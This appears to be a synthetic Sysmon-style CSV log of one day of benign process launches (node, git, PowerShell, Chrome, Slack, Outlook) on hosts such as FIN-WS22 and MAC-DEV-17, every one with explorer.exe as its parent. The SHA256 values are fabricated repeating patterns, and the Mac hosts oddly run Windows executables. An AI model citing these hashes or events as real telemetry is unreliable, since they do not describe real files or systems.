UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-09 00:00:00.000,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0014b964f0240c460014b964f0240c460014b964f0240c460014b964f0240c46
2026-03-09 00:11:33.839,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0009a3d654fb25020009a3d654fb25020009a3d654fb25020009a3d654fb2502
2026-03-09 00:15:23.238,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0007a50d221328db0007a50d221328db0007a50d221328db0007a50d221328db
2026-03-09 00:28:24.962,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001f4825c42bea03001f4825c42bea03001f4825c42bea03001f4825c42bea03
2026-03-09 00:31:54.445,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007c3757449e5ed0007c3757449e5ed0007c3757449e5ed0007c3757449e5ed
2026-03-09 00:45:49.308,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=000f7104afc7862b000f7104afc7862b000f7104afc7862b000f7104afc7862b
2026-03-09 00:56:37.228,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00019677d8fc22b100019677d8fc22b100019677d8fc22b100019677d8fc22b1
2026-03-09 01:06:48.164,MAC-DEV-04,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00024a6481b5e76300024a6481b5e76300024a6481b5e76300024a6481b5e763
2026-03-09 01:18:36.793,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00157988a989a02300157988a989a02300157988a989a02300157988a989a023
2026-03-09 01:26:34.411,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0003a4c9c5a731690003a4c9c5a731690003a4c9c5a731690003a4c9c5a73169
2026-03-09 01:39:28.085,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00149bf34adb865c00149bf34adb865c00149bf34adb865c00149bf34adb865c
2026-03-09 01:54:21.006,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001e74e460e4b08d001e74e460e4b08d001e74e460e4b08d001e74e460e4b08d
2026-03-09 02:07:12.691,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0012890a3bb1707c0012890a3bb1707c0012890a3bb1707c0012890a3bb1707c
2026-03-09 02:18:01.308,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0003e494e09c74330003e494e09c74330003e494e09c74330003e494e09c7433
2026-03-09 02:21:46.736,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001cebbd7d7e1316001cebbd7d7e1316001cebbd7d7e1316001cebbd7d7e1316
2026-03-09 02:31:24.005,MAC-DEV-04,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0014d19d731a18080014d19d731a18080014d19d731a18080014d19d731a1808
2026-03-09 02:40:30.673,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000c2d04af14bf82000c2d04af14bf82000c2d04af14bf82000c2d04af14bf82
2026-03-09 02:54:10.054,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b8f86dd7c1001001b8f86dd7c1001001b8f86dd7c1001001b8f86dd7c1001
2026-03-09 03:06:25.951,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b34ec239a968b000b34ec239a968b000b34ec239a968b000b34ec239a968b
2026-03-09 03:12:32.318,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=0018000ee3cd329d0018000ee3cd329d0018000ee3cd329d0018000ee3cd329d
2026-03-09 03:15:36.928,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=001b28599cd4bf45001b28599cd4bf45001b28599cd4bf45001b28599cd4bf45
2026-03-09 03:27:19.191,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017ff123b988e100017ff123b988e100017ff123b988e100017ff123b988e10
2026-03-09 03:34:52.678,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001db04b3f7b7b13001db04b3f7b7b13001db04b3f7b7b13001db04b3f7b7b13
2026-03-09 03:39:20.188,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=00174ebb7c5fa03000174ebb7c5fa03000174ebb7c5fa03000174ebb7c5fa030
2026-03-09 03:47:56.370,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001608742cbf062d001608742cbf062d001608742cbf062d001608742cbf062d
2026-03-09 03:52:23.039,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b143145881e66001b143145881e66001b143145881e66001b143145881e66
2026-03-09 04:02:03.406,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0002489200d2ec1f0002489200d2ec1f0002489200d2ec1f0002489200d2ec1f
2026-03-09 04:07:46.938,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000255dfd0cd69ea000255dfd0cd69ea000255dfd0cd69ea000255dfd0cd69ea
2026-03-09 04:11:37.209,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0022988019bc62140022988019bc62140022988019bc62140022988019bc6214
2026-03-09 04:21:34.118,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a542021fee617001a542021fee617001a542021fee617001a542021fee617
2026-03-09 04:26:17.237,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000cde843cdb64f3000cde843cdb64f3000cde843cdb64f3000cde843cdb64f3
2026-03-09 04:41:10.438,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000969ea60ee799a000969ea60ee799a000969ea60ee799a000969ea60ee799a
2026-03-09 04:49:31.204,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021b6168f2457940021b6168f2457940021b6168f2457940021b6168f245794
2026-03-09 04:57:24.153,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001d6de49141e0c8001d6de49141e0c8001d6de49141e0c8001d6de49141e0c8
2026-03-09 05:07:56.364,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013913d795fbd950013913d795fbd950013913d795fbd950013913d795fbd95
2026-03-09 05:18:28.994,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=000f2bdf7572ee5c000f2bdf7572ee5c000f2bdf7572ee5c000f2bdf7572ee5c
2026-03-09 05:32:16.786,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=00236a77e1d8019c00236a77e1d8019c00236a77e1d8019c00236a77e1d8019c
2026-03-09 05:37:12.078,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000a4ad41d10b972000a4ad41d10b972000a4ad41d10b972000a4ad41d10b972
2026-03-09 05:42:58.637,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0002fc63c0330a040002fc63c0330a040002fc63c0330a040002fc63c0330a04
2026-03-09 05:47:27.591,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007dc9af745d27a0007dc9af745d27a0007dc9af745d27a0007dc9af745d27a
2026-03-09 05:52:07.237,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013c3af1b1a45480013c3af1b1a45480013c3af1b1a45480013c3af1b1a4548
2026-03-09 06:03:22.502,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e1d2d18e53e6b000e1d2d18e53e6b000e1d2d18e53e6b000e1d2d18e53e6b
2026-03-09 06:17:41.911,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=0006871f67a3dfac0006871f67a3dfac0006871f67a3dfac0006871f67a3dfac
2026-03-09 06:22:59.434,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0021e7bbf11cf6920021e7bbf11cf6920021e7bbf11cf6920021e7bbf11cf692
2026-03-09 06:31:21.128,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=000aea80f1628df1000aea80f1628df1000aea80f1628df1000aea80f1628df1
2026-03-09 06:39:13.058,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0018bd95210454a10018bd95210454a10018bd95210454a10018bd95210454a1
2026-03-09 06:43:14.852,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b21b3b4f4d518001b21b3b4f4d518001b21b3b4f4d518001b21b3b4f4d518
2026-03-09 06:46:28.710,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00069199562ff5f600069199562ff5f600069199562ff5f600069199562ff5f6
2026-03-09 06:55:47.170,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0010cfc61c0485810010cfc61c0485810010cfc61c0485810010cfc61c048581
2026-03-09 07:07:04.068,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019a9d46d238e270019a9d46d238e270019a9d46d238e270019a9d46d238e27
2026-03-09 07:12:43.898,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007e8e457dc4fe70007e8e457dc4fe70007e8e457dc4fe70007e8e457dc4fe7
2026-03-09 07:25:15.526,BLD-RUN-02,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002c3092ed9a8590002c3092ed9a8590002c3092ed9a8590002c3092ed9a859
2026-03-09 07:33:30.702,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001f0ecfa7057d0a001f0ecfa7057d0a001f0ecfa7057d0a001f0ecfa7057d0a
2026-03-09 07:42:58.981,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013d4e39c03c7f50013d4e39c03c7f50013d4e39c03c7f50013d4e39c03c7f5
2026-03-09 07:52:01.065,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f65542b38f503000f65542b38f503000f65542b38f503000f65542b38f503
2026-03-09 07:58:18.951,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=00007426142584a900007426142584a900007426142584a900007426142584a9
2026-03-09 08:05:43.986,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00184c9d0a60799900184c9d0a60799900184c9d0a60799900184c9d0a607999
2026-03-09 08:19:19.006,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f0abf479872ea001f0abf479872ea001f0abf479872ea001f0abf479872ea
2026-03-09 08:31:32.271,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011fac7f7c54f0f0011fac7f7c54f0f0011fac7f7c54f0f0011fac7f7c54f0f
2026-03-09 08:45:49.097,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079e03f172b93a00079e03f172b93a00079e03f172b93a00079e03f172b93a
2026-03-09 08:50:37.490,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0003593222ee19450003593222ee19450003593222ee19450003593222ee1945
2026-03-09 08:55:50.380,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000bf759fe006c13000bf759fe006c13000bf759fe006c13000bf759fe006c13
2026-03-09 09:10:40.882,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00057dfeb86a7f2000057dfeb86a7f2000057dfeb86a7f2000057dfeb86a7f20
2026-03-09 09:19:14.184,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000ed248d9dbfd24000ed248d9dbfd24000ed248d9dbfd24000ed248d9dbfd24
2026-03-09 09:31:24.359,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=000c1069288fc48d000c1069288fc48d000c1069288fc48d000c1069288fc48d
2026-03-09 09:37:17.709,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0013151f149188310013151f149188310013151f149188310013151f14918831
2026-03-09 09:50:36.159,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a644d13e10baf001a644d13e10baf001a644d13e10baf001a644d13e10baf
2026-03-09 10:00:03.524,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=001d9923655a5eed001d9923655a5eed001d9923655a5eed001d9923655a5eed
2026-03-09 10:06:05.264,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001be73e38afdfe3001be73e38afdfe3001be73e38afdfe3001be73e38afdfe3
2026-03-09 10:12:31.829,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=001ce6b12d0c3677001ce6b12d0c3677001ce6b12d0c3677001ce6b12d0c3677
2026-03-09 10:23:31.291,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=000c1979d94721cc000c1979d94721cc000c1979d94721cc000c1979d94721cc
2026-03-09 10:30:22.357,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00214477687d946800214477687d946800214477687d946800214477687d9468
2026-03-09 10:42:35.795,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=00012be22620f18300012be22620f18300012be22620f18300012be22620f183
2026-03-09 10:55:35.606,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=00163471285fde9300163471285fde9300163471285fde9300163471285fde93
2026-03-09 11:06:50.711,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=000cfbf91418dc95000cfbf91418dc95000cfbf91418dc95000cfbf91418dc95
2026-03-09 11:21:49.479,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001d875c634d8fdf001d875c634d8fdf001d875c634d8fdf001d875c634d8fdf
2026-03-09 11:33:13.611,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008a90b5d4def880008a90b5d4def880008a90b5d4def880008a90b5d4def88
2026-03-09 11:46:26.126,FIN-WS22,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cac8514fdddef000cac8514fdddef000cac8514fdddef000cac8514fdddef
2026-03-09 11:58:41.373,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016c48c01fe66e90016c48c01fe66e90016c48c01fe66e90016c48c01fe66e9
2026-03-09 12:04:43.612,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007bd4d424f5e6e0007bd4d424f5e6e0007bd4d424f5e6e0007bd4d424f5e6e
2026-03-09 12:08:37.529,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004dd762b102a3f0004dd762b102a3f0004dd762b102a3f0004dd762b102a3f
2026-03-09 12:14:06.718,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0018e459307248370018e459307248370018e459307248370018e45930724837
2026-03-09 12:27:37.683,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00219cdcb6bd0b5800219cdcb6bd0b5800219cdcb6bd0b5800219cdcb6bd0b58
2026-03-09 12:38:19.421,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007f39e062193b00007f39e062193b00007f39e062193b00007f39e062193b0
2026-03-09 12:49:45.709,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ce23ee71586bc000ce23ee71586bc000ce23ee71586bc000ce23ee71586bc
2026-03-09 12:58:37.220,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0000155f4028cf1b0000155f4028cf1b0000155f4028cf1b0000155f4028cf1b
2026-03-09 13:09:44.766,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000dced70d2d865c000dced70d2d865c000dced70d2d865c000dced70d2d865c
2026-03-09 13:14:29.158,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=0015cf38d547c6a00015cf38d547c6a00015cf38d547c6a00015cf38d547c6a0
2026-03-09 13:26:35.181,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=000743df79c4fdac000743df79c4fdac000743df79c4fdac000743df79c4fdac
2026-03-09 13:36:45.964,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079cf7ee7f755800079cf7ee7f755800079cf7ee7f755800079cf7ee7f7558
2026-03-09 13:46:19.769,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006397f3c982ecc0006397f3c982ecc0006397f3c982ecc0006397f3c982ecc
2026-03-09 13:54:20.835,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0005329523fbe3b70005329523fbe3b70005329523fbe3b70005329523fbe3b7
2026-03-09 14:06:19.842,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001ced6e08a3926d001ced6e08a3926d001ced6e08a3926d001ced6e08a3926d
2026-03-09 14:18:41.888,FIN-WS31,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c4ae07d18f0f4000c4ae07d18f0f4000c4ae07d18f0f4000c4ae07d18f0f4
2026-03-09 14:27:45.870,FIN-WS31,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015b18e7978c88f0015b18e7978c88f0015b18e7978c88f0015b18e7978c88f
2026-03-09 14:36:38.882,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00033204bbc4585c00033204bbc4585c00033204bbc4585c00033204bbc4585c
2026-03-09 14:40:39.148,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f570e178e365a000f570e178e365a000f570e178e365a000f570e178e365a
2026-03-09 14:55:00.216,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=00139ce6ee7ce0c800139ce6ee7ce0c800139ce6ee7ce0c800139ce6ee7ce0c8
2026-03-09 15:09:28.692,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e4bf4106d158f000e4bf4106d158f000e4bf4106d158f000e4bf4106d158f
2026-03-09 15:23:48.225,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0005f9c43b335b7d0005f9c43b335b7d0005f9c43b335b7d0005f9c43b335b7d
2026-03-09 15:35:04.679,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a6f8270ee4c6a000a6f8270ee4c6a000a6f8270ee4c6a000a6f8270ee4c6a
2026-03-09 15:43:30.168,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008d281eedc39420008d281eedc39420008d281eedc39420008d281eedc3942
2026-03-09 15:49:59.812,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00154867677b78f000154867677b78f000154867677b78f000154867677b78f0
2026-03-09 16:02:57.718,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000fd1b3bc3bd778000fd1b3bc3bd778000fd1b3bc3bd778000fd1b3bc3bd778
2026-03-09 16:10:26.755,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000684a94cd6c0fa000684a94cd6c0fa000684a94cd6c0fa000684a94cd6c0fa
2026-03-09 16:22:08.100,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001fe038291b8c6a001fe038291b8c6a001fe038291b8c6a001fe038291b8c6a
2026-03-09 16:33:27.038,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001a4bbf61804081001a4bbf61804081001a4bbf61804081001a4bbf61804081
2026-03-09 16:46:33.862,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020b38350e2b93e0020b38350e2b93e0020b38350e2b93e0020b38350e2b93e
2026-03-09 17:00:18.301,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001d5865618de9e9001d5865618de9e9001d5865618de9e9001d5865618de9e9
2026-03-09 17:07:34.541,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c85c4d71d1124000c85c4d71d1124000c85c4d71d1124000c85c4d71d1124
2026-03-09 17:19:06.158,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=0001a92d255968700001a92d255968700001a92d255968700001a92d25596870
2026-03-09 17:28:10.766,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e0f53ff8da8b9001e0f53ff8da8b9001e0f53ff8da8b9001e0f53ff8da8b9
2026-03-09 17:42:28.151,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014a0ca0b5aa2e40014a0ca0b5aa2e40014a0ca0b5aa2e40014a0ca0b5aa2e4
2026-03-09 17:52:28.554,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00201ec93f978db600201ec93f978db600201ec93f978db600201ec93f978db6
2026-03-09 18:00:43.841,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0019ec0dea48ed430019ec0dea48ed430019ec0dea48ed430019ec0dea48ed43
2026-03-09 18:08:37.268,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00013c8a84206e6b00013c8a84206e6b00013c8a84206e6b00013c8a84206e6b
2026-03-09 18:17:10.966,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004c8bcaef55a020004c8bcaef55a020004c8bcaef55a020004c8bcaef55a02
2026-03-09 18:23:27.856,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000eb7664cc2898c000eb7664cc2898c000eb7664cc2898c000eb7664cc2898c
2026-03-09 18:30:56.372,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a704ba96c0005001a704ba96c0005001a704ba96c0005001a704ba96c0005
2026-03-09 18:42:37.160,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=0017da83f8068a5a0017da83f8068a5a0017da83f8068a5a0017da83f8068a5a
2026-03-09 18:46:35.963,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00055e836d11009200055e836d11009200055e836d11009200055e836d110092
2026-03-09 18:59:18.135,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00068c71f3506a3900068c71f3506a3900068c71f3506a3900068c71f3506a39
2026-03-09 19:05:43.921,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00143a0b56fab0bf00143a0b56fab0bf00143a0b56fab0bf00143a0b56fab0bf
2026-03-09 19:15:33.463,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e0f05a12ec02a000e0f05a12ec02a000e0f05a12ec02a000e0f05a12ec02a
2026-03-09 19:24:31.641,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00029f3de3b7143100029f3de3b7143100029f3de3b7143100029f3de3b71431
2026-03-09 19:33:50.012,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=000fcb0f3ca05fc0000fcb0f3ca05fc0000fcb0f3ca05fc0000fcb0f3ca05fc0
2026-03-09 19:44:55.026,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001dd1aeedc3e329001dd1aeedc3e329001dd1aeedc3e329001dd1aeedc3e329
2026-03-09 19:59:02.680,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017d73e2bcf9c8b0017d73e2bcf9c8b0017d73e2bcf9c8b0017d73e2bcf9c8b
2026-03-09 20:03:38.690,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00134652b79c342200134652b79c342200134652b79c342200134652b79c3422
2026-03-09 20:13:37.069,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=001584bc77b04413001584bc77b04413001584bc77b04413001584bc77b04413
2026-03-09 20:24:10.971,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0020302e9b2aa1a00020302e9b2aa1a00020302e9b2aa1a00020302e9b2aa1a0
2026-03-09 20:29:19.958,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00190ac79c0637d500190ac79c0637d500190ac79c0637d500190ac79c0637d5
2026-03-09 20:37:38.269,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=0004563bfe76f6d90004563bfe76f6d90004563bfe76f6d90004563bfe76f6d9
2026-03-09 20:45:23.388,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00179cc48571d1db00179cc48571d1db00179cc48571d1db00179cc48571d1db
2026-03-09 20:50:54.763,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001771f577d22259001771f577d22259001771f577d22259001771f577d22259
2026-03-09 20:59:51.123,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f82070345b9ef000f82070345b9ef000f82070345b9ef000f82070345b9ef
2026-03-09 21:09:57.849,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a91a149a9f3d7000a91a149a9f3d7000a91a149a9f3d7000a91a149a9f3d7
2026-03-09 21:13:44.054,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000e55bcd116d678000e55bcd116d678000e55bcd116d678000e55bcd116d678
2026-03-09 21:24:04.385,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0006b097570e12d50006b097570e12d50006b097570e12d50006b097570e12d5
2026-03-09 21:34:22.491,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cb8ebea5a6376000cb8ebea5a6376000cb8ebea5a6376000cb8ebea5a6376
2026-03-09 21:43:11.793,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00215f1cb46235bc00215f1cb46235bc00215f1cb46235bc00215f1cb46235bc
2026-03-09 21:50:37.020,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009b8172f1f43490009b8172f1f43490009b8172f1f43490009b8172f1f4349
2026-03-09 22:02:45.006,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00037d055124fd9600037d055124fd9600037d055124fd9600037d055124fd96
2026-03-09 22:14:34.421,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00068a101941201d00068a101941201d00068a101941201d00068a101941201d
2026-03-09 22:21:08.880,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00189212ec5b889900189212ec5b889900189212ec5b889900189212ec5b8899
2026-03-09 22:27:39.822,BLD-RUN-02,e.park,1,node,"node",explorer.exe,,,SHA256=0003b4f7fbdc422f0003b4f7fbdc422f0003b4f7fbdc422f0003b4f7fbdc422f
2026-03-09 22:32:09.854,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014b2e7199dde120014b2e7199dde120014b2e7199dde120014b2e7199dde12
2026-03-09 22:42:59.527,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00168dd9e186e65200168dd9e186e65200168dd9e186e65200168dd9e186e652
2026-03-09 22:46:13.936,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=0023059bcc5c58840023059bcc5c58840023059bcc5c58840023059bcc5c5884
2026-03-09 22:51:19.535,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000101d0ec13b14e000101d0ec13b14e000101d0ec13b14e000101d0ec13b14e
2026-03-09 23:04:14.421,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013d4531e0536e70013d4531e0536e70013d4531e0536e70013d4531e0536e7
2026-03-09 23:09:41.505,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e37a26ec76820001e37a26ec76820001e37a26ec76820001e37a26ec76820
2026-03-09 23:20:45.790,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001684d87e5f1470001684d87e5f1470001684d87e5f1470001684d87e5f1470
2026-03-09 23:34:19.439,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=0009536a2057aa160009536a2057aa160009536a2057aa160009536a2057aa16
2026-03-09 23:42:03.698,MAC-DEV-04,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00100cc0e5083e4f00100cc0e5083e4f00100cc0e5083e4f00100cc0e5083e4f
2026-03-09 23:54:05.494,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=00071bc538e2d95a00071bc538e2d95a00071bc538e2d95a00071bc538e2d95a
